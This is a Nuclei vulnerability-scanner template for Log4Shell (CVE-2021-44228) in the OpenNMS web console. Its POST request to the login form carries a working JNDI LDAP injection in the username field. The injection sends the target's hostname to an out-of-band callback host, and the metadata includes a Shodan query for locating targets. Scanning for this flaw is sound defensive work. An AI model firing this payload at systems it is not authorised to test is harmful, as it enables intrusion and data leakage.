http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /opennms/j_spring_security_check HTTP/1.1

    Referer: {{RootURL}}/opennms/login.jsp

    Content-Type: application/x-www-form-urlencoded


    j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=

    '
id: opennms-log4j-rce
info:
  author: johnk3r
  classification:
    cpe: cpe:2.3:a:opennms:horizon:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'OpenNMS JNDI is susceptible to remote code execution via Apache Log4j
    2.14.1 and before. An attacker who can control log messages or log message parameters
    can execute arbitrary code loaded from LDAP servers when message lookup substitution
    is enabled.

    '
  metadata:
    max-request: 1
    product: horizon
    shodan-query: title:"OpenNMS Web Console"
    vendor: opennms
    verified: true
  name: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
  reference:
  - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
  - https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: jndi,log4j,rce,opennms,cve,cve2021,kev,oast,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
